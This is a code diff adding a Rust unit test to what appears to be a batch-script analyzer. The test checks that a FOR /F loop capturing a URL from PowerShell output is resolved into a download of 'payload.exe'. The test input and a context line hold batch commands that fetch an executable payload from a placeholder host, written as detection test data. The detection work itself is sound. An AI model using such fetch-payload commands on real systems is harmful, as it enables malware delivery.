@@ -9880,6 +9880,37 @@ for /f "tokens=* delims=" %%U in ('type ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_powershell_write_output_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "tokens=* delims=" %%U in ('powershell -Command "Write-Output https://for-f-ps-output.example/payload.exe"') do set U=%%U
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-ps-output.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F PowerShell Write-Output did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("Write-Output https://for-f-ps-output.example")
+            )),
+            "supported PowerShell Write-Output pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn for_f_find_stdin_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>url.txt
